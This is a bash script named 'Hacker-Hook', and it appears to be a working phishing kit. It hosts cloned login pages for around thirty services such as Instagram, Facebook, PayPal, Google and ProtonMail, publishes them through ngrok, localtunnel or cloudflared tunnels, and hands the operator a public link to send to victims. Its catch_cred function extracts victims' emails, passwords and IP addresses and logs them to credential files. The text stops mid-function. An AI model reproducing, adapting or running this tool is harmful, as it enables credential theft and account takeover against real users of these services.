#!/bin/bash
# Hacker-Hook v2.6
# color
# Reset
clear='\033[0m'       # Text Reset
clr='\033[0m'
# Regular Colors
Black='\033[0;30m'        # Black
Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
Blue='\033[0;34m'         # Blue
Purple='\033[0;35m'       # Purple
Cyan='\033[0;36m'         # Cyan
White='\033[0;37m'        # White

# Bold
BBlack='\033[1;30m'       # Black
BRed='\033[1;31m'         # Red
BGreen='\033[1;32m'       # Green
BYellow='\033[1;33m'      # Yellow
BBlue='\033[1;34m'        # Blue
BPurple='\033[1;35m'      # Purple
BCyan='\033[1;36m'        # Cyan
BWhite='\033[1;37m'       # White

# Underline
UBlack='\033[4;30m'       # Black
URed='\033[4;31m'         # Red
UGreen='\033[4;32m'       # Green
UYellow='\033[4;33m'      # Yellow
UBlue='\033[4;34m'        # Blue
UPurple='\033[4;35m'      # Purple
UCyan='\033[4;36m'        # Cyan
UWhite='\033[4;37m'       # White

    version=2.9

# Check if root
if [ "$EUID" -ne 0 ]
        then
                printf "${Red}Opps! ${BGreen}'sudo' ${Red}Please!\n${clr}"
                exit
else
            trap 'printf "\n";stop;exit 1' 2

    stop() {

        printf "${Green}[${BRed}R${Green}]${BGreen} Re-Run the script\n"
        printf "${Green}[${BRed}X${Green}]${BRed} Exit\n"
        printf "\n"
        read -p "[☢]Restart or Exit: " guard

            if [[ $guard == R || $guard == r ]]; then
                    sleep 0.1
                    killall -2 php > /dev/null 2>&1
                    killall -2 lt > /dev/null 2>&1
                    killall -2 xterm > /dev/null 2>&1
                    killall -2 ngrok > /dev/null 2>&1
                    killall -2 cloudflared > /dev/null 2>&1
                    killall ssh > /dev/null 2>&1
                    if [[ -e sendlink ]]; then
                        rm -rf sendlink
                    fi
                    if [[ -e xtermtunnel ]]; then
                        rm xtermtunnel

                    fi
                    if [[ -e xtermflared ]]; then
                        rm xtermflared

                    fi


                sleep 0.1
                ./hackerhook.sh

            elif [[ $guard == X || $guard == x || $guard == XX || $guard == xx || $guard == Xx || $guard == xX ]]; then
                printf "\n${BGreen}[☢] Thank you for ${BRed}Fishing ${BGreen}with ${BRed}Hacker${BWhite}-${BBlack}Hook${clr}\n"
                printf "${BGreen}[☣] ${BRed}Revenge ${BGreen}is never been a ${BCyan}solution🐟\n"
                printf "${BRed}[☣] Exit!${clear}\n"
                stop1

            else
                stop
            fi

    }

    stop1() {

        checknode=$(ps aux | grep -o "node" | head -n1)
        checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
        checkphp=$(ps aux | grep -o "php" | head -n1)
        checkssh=$(ps aux | grep -o "ssh" | head -n1)
        checkflare=$(ps aux | grep -o "cloudflared" | head -n1)
        checklt=$(ps aux | grep -o "lt" | head -n1)
            if [[ $checkngrok == *'ngrok'* ]]; then
                pkill -f -2 ngrok > /dev/null 2>&1
                killall -2 ngrok > /dev/null 2>&1
            fi
            if [[ $checknode == *'node'* ]]; then
                pkill -f -2 node > /dev/null 2>&1
                killall -2 node > /dev/null 2>&1
            fi
            if [[ $checkphp == *'php'* ]]; then
                pkill -f -2 php > /dev/null 2>&1
                killall -2 php > /dev/null 2>&1
            fi
            if [[ $checkssh == *'ssh'* ]]; then
                pkill -f -2 ssh > /dev/null 2>&1
                killall ssh > /dev/null 2>&1
            fi
            if [[ $checkflare == *'cloudflared'* ]]; then
                pkill -f -2 cloudflared > /dev/null 2>&1
                killall cloudflared > /dev/null 2>&1
            fi
            if [[ $checklt == *'lt'* ]]; then
                pkill -f -2 lt > /dev/null 2>&1
                killall lt > /dev/null 2>&1
            fi
            if [[ -e sendlink ]]; then
                rm -rf sendlink
            fi
            if [[ -e xtermtunnel ]]; then
                rm xtermtunnel

            fi
            if [[ -e xtermflared ]]; then
                rm xtermflared

            fi

    }

    installdependencies() {
                xterm -T 'Update' -geometry 90x26+1000 -e 'apt update' > /dev/null 2>&1 &
                pid0=$!
                wait $pid0
                    pkgs='php'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid1=$!
                        wait $pid1
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='wget'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid2=$!
                        wait $pid2
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='unzip'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid3=$!
                        wait $pid3
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='curl'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid4=$!
                        wait $pid4
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                    pkgs='npm'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Installer' -geometry 90x26+1000  -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid5=$!
                        wait $pid5
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi
                    
                    pkgs='xterm'
                    if ! dpkg -s $pkgs >/dev/null 2>&1; then
                        xterm -T 'Update' -geometry 90x26+1000 -e 'apt install '${pkgs} > /dev/null 2>&1 &
                        pid6=$!
                        wait $pid6
                    else
                        sleep 1
                        printf "${BCyan}[🪝] ${pkgs} ${BGreen}Installed${clr}\n"
                    fi

                #command -v rkhunter > /dev/null 2>&1 || { echo >&2 "${Red}Installing rkhunter."; xterm -T 'Installer' -geometry 90x26+0+0 -hold -e 'apt install rkhunter' > /dev/null 2>&1 &; exit 1; }
                #command -v php > /dev/null 2>&1 || { echo >&2 "${Red}Installing php."; apt-get install php -y; exit 1; }
                #command -v wget > /dev/null 2>&1 || { echo >&2 "${Red}Installing wget."; apt-get install wget -y; exit 1; }
                #command -v unzip > /dev/null 2>&1 || { echo >&2 "${Red}Installing unzip."; apt-get install wget -y; exit 1; }
                #command -v curl > /dev/null 2>&1 || { echo >&2 "${Red}Installing curl."; apt-get install curl -y; exit 1; }
                #command -v lt > /dev/null 2>&1 || { echo >&2 "${Red}Installing localtunnel."; apt-get install npm -y; sleep 2; npm install -g localtunnel;  exit 1; }
                #command -v ngrok > /dev/null 2>&1 || { echo >&2 "${Red}Download NGROK from Official site."; exit 1; }
                #printf "\n"
                #printf "${BGreen}Version ${version}"
                exit 0
                }

    dependencies() {
            #command -v rkhunter > /dev/null 2>&1 || { printf >&2 "${BRed}Missing Dependencies Try ${Green}'${BBlack}sudo ./hackerhook.sh -i${Green}'${BRed}. Aborting."; exit 1; }
            command -v php > /dev/null 2>&1 || { printf >&2 "${BRed}Missing Dependencies Try ${Green}'${BBlack}sudo ./hackerhook.sh -i${Green}'${BRed}. Aborting."; exit 1; }
            command -v wget > /dev/null 2>&1 || { printf >&2 "${BRed}Missing Dependencies Try ${Green}'${BBlack}sudo ./hackerhook.sh -i${Green}'${BRed}. Aborting."; exit 1; }
            command -v unzip > /dev/null 2>&1 || { printf >&2 "${BRed}Missing Dependencies Try ${Green}'${BBlack}sudo ./hackerhook.sh -i${Green}'${BRed}. Aborting."; exit 1; }
            command -v curl > /dev/null 2>&1 || { printf >&2 "${BRed}Missing Dependencies Try ${Green}'${BBlack}sudo ./hackerhook.sh -i${Green}'${BRed}. Aborting."; exit 1; }
            command -v lt > /dev/null 2>&1 || { printf >&2 "${BRed}Missing Dependencies Try ${Green}'${BBlack}sudo ./hackerhook.sh -i${Green}'${BRed}. Aborting."; exit 1; }
            command -v ngrok > /dev/null 2>&1 || { printf >&2 "${BRed}Missing Dependencies Try ${Green}'${BBlack}sudo ./hackerhook.sh -i${Green}'${BRed}. Aborting."; exit 1; }
    }



    banner() {
    clear
    sleep 0.1
        printf "${clr}\n"
        printf "${BRed}██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗${BWhite}       ${BBlack}██╗  ██╗ ██████╗  ██████╗ ██╗  ██╗\n"
        printf "${BRed}██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗${BWhite}      ${BBlack}██║  ██║██╔═══██╗██╔═══██╗██║ ██╔╝\n"
        printf "${BRed}███████║███████║██║     █████╔╝ █████╗  ██████╔╝${BWhite}█████╗${BBlack}███████║██║   ██║██║   ██║█████╔╝ \n"
        printf "${BRed}██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗${BWhite}╚════╝${BBlack}██╔══██║██║   ██║██║   ██║██╔═██╗ \n"
        printf "${BRed}██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║${BWhite}      ${BBlack}██║  ██║╚██████╔╝╚██████╔╝██║  ██╗\n"
        printf "${BRed}╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${BWhite}      ${BBlack}╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n"
        printf "                                                 ${BRed}ImportError: ${BBlack}No module named 'J0hnSm1th'\n"
        printf "=========================================================================================\n"
        printf "                                                                           ${White}by: ${BGreen}John${BRed}Smith☢\n"
        printf "                                                                              ${BGreen}Version ${BRed}$version \n"
        echo ""

    }

    banner2() {
    clear
    sleep 0.1
        printf "${clr}\n"
        printf "${BRed} _   _            _            ${BWhite}       ${BGreen} _   _             _     \n"
        printf "${BRed}| | | |          | |           ${BWhite}       ${BGreen}| | | |           | |    \n"
        printf "${BRed}| |_| | __ _  ___| | _____ _ __${BWhite} ______${BGreen}| |_| | ___   ___ | | __ \n"
        printf "${BRed}|  _  |/ _' |/ __| |/ / _ \ '__${BWhite}|______${BGreen}|  _  |/ _ \ / _ \| |/ / \n"
        printf "${BRed}| | | | (_| | (__|   <  __/ |  ${BWhite}       ${BGreen}| | | | (_) | (_) |   <  \n"
        printf "${BRed}\_| |_/\__,_|\___|_|\_\___|_|  ${BWhite}       ${BGreen}\_| |_/\___/ \___/|_|\_\ \n"
        printf "_________________________________________________________________\n"
        printf "                                                ${White}by: ${BGreen}John${BRed}Smith ${version}\n"
    }

    banner3() {
        sleep 0.1
        printf "${clr}\n"
        printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇ ${BGreen}Version: ${BRed}${version}\n"
        printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
        printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
        printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⣶⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
        printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀${BRed}⢸⡇\n"
        printf "${BGreen}⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢉⣡⣤⣶⣶⣶⣶⣶⣶⣶⣶⣤⠀⠀${BRed}⢸⣇\n"
        printf "${BGreen}⠀⠀⠙⣿⣷⣦⡀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣿⠋⠉⣿⠟⠁⠀⠀${BRed}⢸⡟\n"
        printf "${BGreen}⠀⠀⠀⢸⣿⡿⠋⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠖⠁⠀⠀${BRed}⣷⡄⢸⡇\n"
        printf "${BGreen}⠀⠀⠀⠀⣿⠁⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀${BRed}⢿⣀⣸⡇\n"
        printf "${BGreen}⠀⠀⠀⠀⣿⣷⣤⣈⠛⠻⢿⣿⡿⢁⣼⣿⣿⡿⠛⣿⣿⣿⣦⣄⡀${BRed}⠈⠉⠉⠁\n"
        printf "${BGreen}⠀⠀⠀⢀⣿⡿⠟⠁⠀⠀⠀⠀⠀⠛⠉⠉⠠⠤⠾⠿⠿⠿⠿⠟⠛⠋⠁⠀⠀\n"
        printf "${BGreen}⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n"
        printf "${clr}"
    }

    menu() {
        printf "${Red}[${White}01${Red}]${BGreen} -Instagram     ${Red}[${White}11${Red}]${BGreen} -Steam              ${Red}[${White}21${Red}]${BGreen} -Verizon       ${Red}[${White}31${Red}]${BGreen} -Yandex\n"
        printf "${Red}[${White}02${Red}]${BGreen} -Facebook      ${Red}[${White}12${Red}]${BGreen} -Yahoo              ${Red}[${White}22${Red}]${BGreen} -DropBox       ${Red}[${White}32${Red}]${BGreen} -devianART\n"
        printf "${Red}[${White}03${Red}]${BGreen} -Snapchat      ${Red}[${White}13${Red}]${BGreen} -Linkedin           ${Red}[${White}23${Red}]${BGreen} -Adove ID      ${Red}[${White}33${Red}]${BGreen} -Dreamland (added)\n"
        printf "${Red}[${White}04${Red}]${BGreen} -Twitter       ${Red}[${White}14${Red}]${BGreen} -ProtonMail         ${Red}[${White}24${Red}]${BGreen} -Shopify       ${Red}[${White}34${Red}]${BGreen} -WiFi-Firm  (Beta)\n"
        printf "${Red}[${White}05${Red}]${BGreen} -Github        ${Red}[${White}15${Red}]${BGreen} -WordPress          ${Red}[${White}25${Red}]${BGreen} -Messenger     ${Red}[${White}35${Red}]${BGreen} -Lazada  (Removed)\n"
        printf "${Red}[${White}06${Red}]${BGreen} -Google        ${Red}[${White}16${Red}]${BGreen} -Microsoft          ${Red}[${White}26${Red}]${BGreen} -GitLab        ${Red}[${White}36${Red}]${BGreen} -Shopee  (Removed)\n"
        printf "${Red}[${White}07${Red}]${BGreen} -Spotify       ${Red}[${White}17${Red}]${BGreen} -IGFollowers        ${Red}[${White}27${Red}]${BGreen} -Twitch        ${Red}[${White}37${Red}]${BGreen} -Starbucks  (Beta)\n"
        printf "${Red}[${White}08${Red}]${BGreen} -Netflix       ${Red}[${White}18${Red}]${BGreen} -eBay               ${Red}[${White}28${Red}]${BGreen} -MySpace       ${Red}[${White}38${Red}]${BGreen} -WiFi-Login (Beta)\n"
        printf "${Red}[${White}09${Red}]${BGreen} -Paypal        ${Red}[${White}19${Red}]${BGreen} -Pinterest          ${Red}[${White}29${Red}]${BGreen} -Badoo         ${Red}[${White}Xx${Red}]${BRed} -Exit${Red}\n"
        printf "${Red}[${White}10${Red}]${BGreen} -Origin        ${Red}[${White}20${Red}]${BGreen} -CryptoCurrency     ${Red}[${White}30${Red}]${BGreen} -VK            \n"
        printf "${BCyan}"
        echo ""
    read -p "[🪝]Get H-Hook: " option 


            if [[ $option == 1 || $option == 01 ]]; then
                site="instagram"
                server

            elif [[ $option == 2 || $option == 02 ]]; then
                menu2

            elif [[ $option == 3 || $option == 03 ]]; then
                site="snapchat"
                server

            elif [[ $option == 4 || $option == 04 ]]; then
                site="twitter"
                server

            elif [[ $option == 5 || $option == 05 ]]; then
                site="github"
                server

            elif [[ $option == 6 || $option == 06 ]]; then
                site="google"
                server

            elif [[ $option == 7 || $option == 07 ]]; then
                site="spotify"
                server

            elif [[ $option == 8 || $option == 08 ]]; then
                site="netflix"
                server

            elif [[ $option == 9 || $option == 09 ]]; then
                site="paypal"
                server

            elif [[ $option == 10 ]]; then
                site="origin"
                server

            elif [[ $option == 11 ]]; then
                site="steam"
                server

            elif [[ $option == 12 ]]; then
                site="yahoo"
                server

            elif [[ $option == 13 ]]; then
                site="linkedin"
                server

            elif [[ $option == 14 ]]; then
                site="protonmail"
                server

            elif [[ $option == 15 ]]; then
                site="wordpress"
                server

            elif [[ $option == 16 ]]; then
                site="microsoft"
                server

            elif [[ $option == 17 ]]; then
                site="instafollowers"
                server

            elif [[ $option == 18 ]]; then
                site="shopping"
                server

            elif [[ $option == 19 ]]; then
                site="pinterest"
                server

            elif [[ $option == 20 ]]; then
                site="cryptocurrency"
                server

            elif [[ $option == 21 ]]; then
                site="verizon"
                server

            elif [[ $option == 22 ]]; then
                site="dropbox"
                server

            elif [[ $option == 23 ]]; then
                site="adobe"
                server

            elif [[ $option == 24 ]]; then
                site="shopify"
                server

            elif [[ $option == 25 ]]; then
                site="messenger"
                server

            elif [[ $option == 26 ]]; then
                site="gitlab"
                server

            elif [[ $option == 27 ]]; then
                site="twitch"
                server

            elif [[ $option == 28 ]]; then
                site="myspace"
                server

            elif [[ $option == 29 ]]; then
                site="badoo"
                server

            elif [[ $option == 30 ]]; then
                site="vk"
                server

            elif [[ $option == 31 ]]; then
                site="yandex"
                server

            elif [[ $option == 32 ]]; then
                site="devianart"
                server

            elif [[ $option == 33 ]]; then
                site="dreamland"
                server

            elif [[ $option == 34 ]]; then
                #site=''
                #server
                #printf "[!]${BRed} Sorry this page has been temporary removed! \n"
                #printf "[!]${BRed} Pick other site.${clr}"
                #sleep 2
                #banner
                #menu
                printf "[#]${BBlue} Not Available! \n"
                printf "[#]${BBlue} Soon.${clr} \n"
                sleep 2
                banner
                menu

            elif [[ $option == 35 ]]; then
                #site=''
                #server
                printf "[!]${BRed} Sorry this page has been temporary removed! \n"
                printf "[!]${BRed} Pick other site.${clr}"
                sleep 2
                banner
                menu

            elif [[ $option == 36 ]]; then
                #site=''
                #server
                printf "[!]${BRed} Sorry this page has been temporary removed! \n"
                printf "[!]${BRed} Pick other site.${clr}"
                sleep 2
                banner
                menu

            elif [[ $option == 37 ]]; then
                site='starbucks'
                server
                #printf "[#]${BBlue} Not Available! \n"
                #printf "[#]${BBlue} Soon.${clr} \n"
                #sleep 2
                #anner
                #menu

            elif [[ $option == 38 ]]; then
                #site='wifi'
                #server
                printf "[#]${BBlue} Not Available! \n"
                printf "[#]${BBlue} Soon.${clr} \n"
                sleep 2
                banner
                menu

            elif [[ $option == x || $option == X || $option == XX || $option == xx || $option == Xx || $option == xX || $option == 'exit' ]]; then
                printf "\n${BGreen}[☢] Thank you for ${BRed}Fishing ${BGreen}with ${BRed}Hacker${BWhite}-${BBlack}Hook${clr}\n"
                printf "${BGreen}[☣] ${BRed}Revenge ${BGreen}is never been a ${BCyan}solution🐟\n"
                printf "${BRed}[☣] Exit!${clear}\n"
                stop1
                #exit 1

            else
                printf "${BRed}[!] Invalid option!${clear}\n"
                sleep 0.1
                clear
                banner
                menu
            fi
    }

    menu2() {
        banner
        printf "${Red}[🪝${Red}]${BWhite} Choose Facebook Page: \n"
        printf "\n${Red}[${White}01${Red}]${BGreen} -Facebook\n"
        printf "${Red}[${White}02${Red}]${BGreen} -Facebook 2020\n"
        printf "${Red}[${White}03${Red}]${BGreen} -or ${BRed}B ${BGreen}to Go back to menu\n"
        printf "${BCyan}\n"
        read -p "[🪝]H-Hook Facebook: " option

            if [[ $option == 1 || $option == 01 ]]; then
                site="facebook"
                server
            elif [[ $option == 2 || $option == 02 ]]; then
                site="facebo0k"
                server
            elif [[ $option == 3 || $option == 03 || $option == B || $option == b ]]; then
                banner
                menu
            elif [[ $option == x || $option == X || $option == XX || $option == xx || $option == Xx || $option == xX || $option == 'exit' ]]; then
                printf "\n${BGreen}[☢] Thank you for ${BRed}Fishing ${BGreen}with ${BRed}Hacker${BWhite}-${BBlack}Hook${clr}\n"
                printf "${BGreen}[☣] ${BRed}Revenge ${BGreen}is never been a ${BCyan}solution🐟\n"
                printf "${BRed}[☣] Exit!${clear}\n"
                stop1
            else
                printf "${BRed}[!] Invalid option!${clear}\n"
                menu2
            fi

    }

    server001() {
    banner2
            if [[ -e webpage/$site/ip.txt ]]; then
                rm -rf webpage/$site/ip.txt

            fi
            if [[ -e webpage/$site/usernames.txt ]]; then
                rm -rf webpage/$site/usernames.txt

            fi

            # if [[ -e webpage/credentials.txt ]]; then
            # echo '-----------------------------------/n' >> webpage/credentials.txt

            # else
            # echo '1' >> webpage/credentials.txt

            # fi

        printf "${Yellow}Starting ${BGreen}PHP ${Green}server "
        cd webpage/$site && xterm -geometry 90x26+1000 -T "PHP server🅿️" -hold -e "php -S 127.0.0.1:80" > /dev/null 2>&1 & 
        sleep 5
        printf "${BGreen}OK.${clear}\n"
        printf "${Yellow}Starting ${BGreen}NGROK ${Green}server "
        xterm -T "NGROK server ☣" -geometry 90x26+1000+1000 -hold -e "/usr/local/bin/ngrok http 80" > /dev/null 2>&1 &
        sleep 8
        printf "${BGreen}OK. ${BRed}(NOTE: ${Red}using NGROK could caused of account banned) ${clear}\n\n"
        link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[-0-9a-z]*\.ngrok.io')
        sleep 3
        printf "${BYellow}Localhost: ${BGreen}127.0.0.1:80"
        printf "\n\n"
        printf "${BYellow}Your URL is:${BGreen} %s\e[0m\n" $link
        printf "\n"
        sleep 2

            if [[ -e webpage/credentials.txt ]]; then
                echo "💀----------------------------------💀" > webpage/credentials.txt
                printf "\nWebsite: $site \n\n" >> webpage/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
                sleep 1

            else
                printf '0' > webpage/credentials.txt
                echo "💀----------------------------------💀" > webpage/credentials.txt
                printf "\nWebsite: $site \n\n" >> webpage/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
                sleep 1
            fi

        checkfound

    }

    server002() {
        banner2
            if [[ -e webpage/$site/ip.txt ]]; then
                rm -rf webpage/$site/ip.txt

            fi

            if [[ -e webpage/$site/usernames.txt ]]; then
                rm -rf webpage/$site/usernames.txt

            fi

            if [[ -e xtermtunnel ]]; then
                rm xtermtunnel

            fi
            if [[ -e xtermflared ]]; then
                rm xtermflared

            fi

            # if [[ -e webpage/credentials.txt ]]; then
            # echo '-----------------------------------/n' >> webpage/credentials.txt

            # else
            # echo '1' >> webpage/credentials.txt

            # fi

        printf "${Yellow}Starting ${BGreen}PHP ${Green}server "
        cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server🅿️" -e "php -S 127.0.0.1:80" > /dev/null 2>&1 &
        sleep 5
        printf "${BGreen}OK.${clear}\n"
        printf "${Yellow}Starting ${BGreen}LocalTunnel ${Green}server "
        xterm -hold -geometry 90x26+1000+1000 -l -lf xtermtunnel -T "LocalTunnel server ☣" -e "lt --port 80 --subdomain $site-com --print-requests" > /dev/null 2>&1 & 
        sleep 5
        printf "${BGreen}OK.${clear}\n\n"
        sleep 3
        # tnnl="(cat xtermtunnel | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*')"
        printf "${BYellow}Localhost: ${BGreen}127.0.0.1:80"
        printf "\n\n"
        printf "${BYellow}Your URL is: ${BGreen} "&& cat xtermtunnel | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*'
        printf "\n"
        printf "\n"
        sleep 2
            if [[ -e webpage/credentials.txt ]]; then
                printf "Website: $site \n\n" > webpage/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
                sleep 1

            else
                printf '0' > webpage/credentials.txt
                printf "Website: $site \n\n" > webpage/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
                sleep 1

            fi

            #if [[ -e credentials ]]; then
            #cat webpage/credentials.txt >> credentials

            #else
            #echo credentials
            #cat webpage/credentials.txt >> credentials

            #fi

            checkfound
            #===============================================
    }

    server003() {
    banner2
            if [[ -e webpage/$site/ip.txt ]]; then
                rm -rf webpage/$site/ip.txt

            fi

            if [[ -e webpage/$site/usernames.txt ]]; then
                rm -rf webpage/$site/usernames.txt

            fi

            if [[ -e xtermtunnel ]]; then
                rm xtermtunnel

            fi
            if [[ -e xtermflared ]]; then
                rm xtermflared

            fi

            # if [[ -e webpage/credentials.txt ]]; then
            # echo '-----------------------------------/n' >> webpage/credentials.txt

            # else
            # echo '1' >> webpage/credentials.txt

            # fi

        printf "${Yellow}Starting ${BGreen}PHP ${Green}server "
        cd webpage/$site && xterm -geometry 90x26+1000 -hold -T "PHP server🅿️" -e "php -S 127.0.0.1:80" > /dev/null 2>&1 &
        sleep 5
        printf "${BGreen}OK.${clear}\n"
        printf "${Yellow}Starting ${BGreen}Cloudflared ${Green}server "
        xterm -hold -geometry 90x26+1000+1000 -l -lf xtermflared -T "Cloudflared server ☣" -e "cloudflared tunnel --url 127.0.0.1:80" > /dev/null 2>&1 & 
        sleep 5
        printf "${BGreen}OK.${clear}\n\n"
        sleep 3
        # tnnl="(cat xtermflared | grep -Eo '(http|https)://[a-zA-Z0-9./?=_%:-]*')"
        #clink=cat xtermflared | grep -v "api.trycloudflare.com" | grep -Eo '(https)://[a-zA-Z0-9./?=_%:-]*.trycloudflare.com'
        printf "${BYellow}Localhost: ${BGreen}127.0.0.1:80"
        printf "\n\n"
        printf "${BYellow}Your URL is:${BGreen} "&& cat xtermflared | grep -v "api.trycloudflare.com" | grep -Eo '(https)://[a-zA-Z0-9./?=_%:-]*.trycloudflare.com'
        printf "\n"
        sleep 2
            if [[ -e webpage/credentials.txt ]]; then
                printf "Website: $site \n\n" > webpage/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
                sleep 1

            else
                printf '0' > webpage/credentials.txt
                printf "Website: $site \n\n" > webpage/credentials.txt
                xterm -T 'Data base' -geometry 90x26+0+0 -hold -e 'tail -f webpage/credentials.txt' > /dev/null 2>&1 &
                sleep 1

            fi

            #if [[ -e credentials ]]; then
            #cat webpage/credentials.txt >> credentials

            #else
            #echo credentials
            #cat webpage/credentials.txt >> credentials

            #fi

            checkfound
            #===============================================
    }

    server() {
        clear
        banner3
        printf "${Red}[🪝${Red}]${BWhite}Choose your host server\n\n"
        printf "${Red}[🪝${Red}]${BWhite}Deautherist Team received a request to remove NGROK from this program as This tool directly violates \n\n"
        printf "${Red}[🪝${Red}]${BWhite}the ngrok Terms of Service, even when used for educational purposes only. As a result, we didn't include \n"
        printf "${Red}[🪝${Red}]${BWhite}ngrok on our repo but the option to use it is still available, note that using ngrok might cause your account \n"
        printf "${Red}[🪝${Red}]${BWhite}for banned. We assume NO liability and are NOT responsible for your account getting banned. \n\n"
        printf "${Red}[${Blue}N${Red}]${BGreen} NGROK ${Green}server ${BYellow}(${BRed}Not Recomended${BYellow})\n"
        printf "${Red}[${Blue}L${Red}]${BGreen} Local Tunnel ${Green}server ${BYellow}(${BBlue}Sometimes Doesnt Work.${BYellow})\n"
        printf "${Red}[${Blue}C${Red}]${BGreen} Cloudflare ${Green}server ${BYellow}(${BGreen}Beta version.${BYellow})\n"
        printf "${Red}[${Blue}B${Red}]${BGreen} Back\n${BCyan}"
        echo ""
        read -p "[🪝]Host Server: " host

            if [[ $host == N || $host == n ]]; then
                printf "[🪝]${UBlue} NGROK.\n"
                sleep 0.5
                server001

            elif [[ $host == L || $host == l ]]; then
                printf "[🪝]${UBlue} Local Tunnel.\n"
                sleep 0.5
                server002
            elif [[ $host == C || $host == c ]]; then
                #printf "[🪝]${UBlue} Cloudflared not available for Now! \n"
                #printf "[🪝]${UBlue} Soon will be.${clr} \n"
                printf "[🪝] ${UBlue}Cloudflared Beta.\n"
                sleep 2
                server003
            elif [[ $host == B || $host == b ]]; then
                banner
                menu
            elif [[ $host == X || $host == x || $host == XX || $host == xx || $host == Xx || $host == xX || $host == 'exit' ]]; then
                sleep 0.5
                printf "\n${BGreen}[☢] Thank you for ${BRed}Fishing ${BGreen}with ${BRed}Hacker${BWhite}-${BBlack}Hook${clr}\n"
                printf "${BGreen}[☣] ${BRed}Revenge ${BGreen}is never been a ${BCyan}solution🐟\n"
                printf "${BRed}[☣] Exit!${clear}\n"
                stop1
            else
                clear
                server
            fi
    }

    catch_cred() {
        account=$(grep -o 'Account:.*' webpage/$site/usernames.txt | cut -d " " -f2)
        IFS=$'\n'
        password=$(grep -o 'Pass:.*' webpage/$site/usernames.txt | cut -d ":" -f2)
        printf "${BGreen}Got the Email: ${White}%s\n\e[0m" $account
        printf "${BGreen}Got the Password: ${White}%s\n\e[0m" $password
        printf "IP Addr: " >> webpage/credentials.txt 
        cat webpage/$site/ip.txt | grep IP | cut -d ":" -f2 | cut -d " " -f2 >> webpage/credentials.txt
        #cat webpage/$site/ip.txt | grep IP | cut -d ":" -f2 | cut -d " " -f2  >> Credentials
        printf "\n" >> webpage/credentials.txt
        cat webpage/$site/usernames.txt >> webpage/credentials.txt
        echo "==================================" >> webpage/credentials.txt
            if [[ -e Credentials ]]; then
                printf "Credential:\n" >> Credentials
                cat webpage/credentials.txt >> Credentials

            else
                printf "Credential:\n" >> Credentials
